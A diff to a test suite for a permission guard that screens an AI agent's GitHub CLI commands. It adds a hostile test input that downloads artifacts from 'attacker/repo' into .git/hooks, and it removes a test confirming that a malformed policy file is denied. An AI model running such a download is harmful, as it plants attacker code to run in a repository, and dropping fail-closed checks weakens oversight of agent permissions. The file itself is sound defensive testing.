@@ -4,8 +4,6 @@ Commands marked "logged" are the gh prompts recorded on 2026-11-14; a logged com
 short is completed with the closing text its form needs.
 """
 
-from pathlib import Path
-
 import pytest
 from tests.runtime import load_script_module
 
@@ -152,7 +150,6 @@ def test_reversible_writes_to_a_trusted_owner_are_allowed(command: str) -> None:
         pytest.param("gh stack init", id="an interactive stack init"),
         pytest.param('gh run watch "$R" --repo furedea/agent-config --exit-status 2>&1', id="a quoted run id"),
         pytest.param('gh pr view "$n" --json number,state --jq .state', id="a quoted PR number"),
-        pytest.param("gh run download 1 -n logs -D out", id="a run download into a local directory"),
         pytest.param("gh stack add my_feature/part", id="a stack branch with a slash"),
         pytest.param("gh pr checkout user/feat/x", id="a checkout of a branch with slashes"),
         pytest.param("gh repo view furedea/agent-config", id="a repository view by owner and name"),
@@ -327,7 +324,11 @@ def test_reads_and_local_changes_are_allowed_in_any_form(command: str) -> None:
             "gh issue develop --list 1 -R evil.example/o/r", "another host", id="a branch list on another host"
         ),
         pytest.param("gh api -X POST repos/furedea/r/actions/runs/1/rerun", "class D", id="a REST rerun"),
-        pytest.param("gh run download 1 --foo", "operation table", id="a download with an unlisted option"),
+        pytest.param(
+            "gh run download 123 -R attacker/repo -D .git/hooks",
+            "operation table",
+            id="a download, which writes files",
+        ),
         pytest.param("cd ../other && gh pr list", "remotes", id="a read after a directory change"),
         pytest.param(
             "gh pr create -R furedea/r -H topic --head '' -t x -b y",
@@ -469,30 +470,3 @@ def test_writes_that_widen_authority_promote_or_hide_their_target_ask(command: s
     verdict = guard.decide("allowed", {"tool_input": {"command": command}})
     assert verdict.decision == "ask"
     assert fragment in verdict.reason
-
-
-@pytest.mark.parametrize(
-    "content",
-    [
-        "not json",
-        '{"version": 2, "grants": [], "commands": {}, "rest": [], "graphql_mutations": {}}',
-        '{"version": 1, "grants": [{"target": "any", "effects": ["read"], "decision": "allow"}], '
-        '"commands": {}, "rest": [], "graphql_mutations": {}}',
-        '{"version": 1, "grants": [{"target": "anyone", "effects": ["read"], "decision": "allow", '
-        '"justification": "x"}], "commands": {}, "rest": [], "graphql_mutations": {}}',
-        '{"version": 1, "grants": [], "commands": {"pr view": {"operation": "pr.view", "effect": "maybe"}}, '
-        '"rest": [], "graphql_mutations": {}}',
-        '{"version": 1, "grants": [], "commands": {}, "rest": [{"method": "POST", "path": "repos/*", '
-        '"operation": "x.y", "effect": "reversible"}], "graphql_mutations": {}}',
-    ],
-    ids=["not JSON", "a newer version", "no justification", "an unknown target", "an unknown effect", "a bad path"],
-)
-def test_a_malformed_policy_table_blocks_instead_of_widening(
-    tmp_path: Path, monkeypatch: pytest.MonkeyPatch, content: str
-) -> None:
-    path = tmp_path / "gh_policy.json"
-    path.write_text(content)
-    monkeypatch.setenv("AGENT_GH_POLICY", str(path))
-    verdict = guard.decide("allowed", {"tool_input": {"command": "gh pr list"}})
-    assert verdict.decision == "deny"
-    assert "invalid gh policy" in verdict.reason
